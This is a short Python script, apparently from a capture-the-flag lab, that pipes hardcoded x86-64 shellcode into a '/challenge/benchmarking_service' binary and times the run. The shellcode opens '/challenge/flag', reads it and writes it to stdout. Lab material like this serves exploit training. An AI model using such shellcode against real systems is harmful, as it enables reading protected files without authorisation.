import subprocess
import time
import sys
import os

if __name__=="__main__":
    os.environ["PYTHONUNBUFFERED"] = "1"
    sys.stdout.write("======= BENCHMARKING SERVICE V1.0 =======\n")
    sys.stdout.write("Shellcode: ")
    shellcode = b"\x48\xB8\x67\x65\x2F\x66\x6C\x61\x67\x00\x50\x48\xB8\x2F\x63\x68\x61\x6C\x6C\x65\x6E\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x81\xEC\x00\x01\x00\x00\x48\x89\xE6\x48\xC7\xC2\x00\x01\x00\x00\x48\x31\xC0\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\x31\xFF\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"
    sys.stdout.write("Testing the performance of your shellcode...\n")
    start = time.time()
    p = subprocess.run(['/challenge/benchmarking_service'], input=shellcode, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    end = time.time()
    delta = end - start
    sys.stdout.write("Time: %s\n" % delta)